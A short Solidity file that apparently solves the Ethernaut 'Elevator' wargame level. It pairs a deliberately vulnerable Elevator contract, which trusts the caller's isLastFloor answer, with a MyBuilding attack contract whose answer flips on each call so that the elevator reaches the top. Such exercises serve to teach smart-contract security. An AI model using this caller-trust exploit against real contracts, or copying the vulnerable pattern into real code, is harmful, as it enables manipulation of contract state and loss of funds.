// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Elevator {
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

interface Building {
    function isLastFloor(uint) external returns (bool);
}

contract MyBuilding is Building {
    uint private counter;
    Elevator elevatorContract;

    constructor(address _elevatorAddress) {
        counter = 0;
        elevatorContract = Elevator(_elevatorAddress);
    }

    function isLastFloor(uint /*floor*/) external override returns (bool) {
        counter++;
        return counter % 2 == 0;
    }

    function attack(uint _floor) public {
        elevatorContract.goTo(_floor);
    }
}
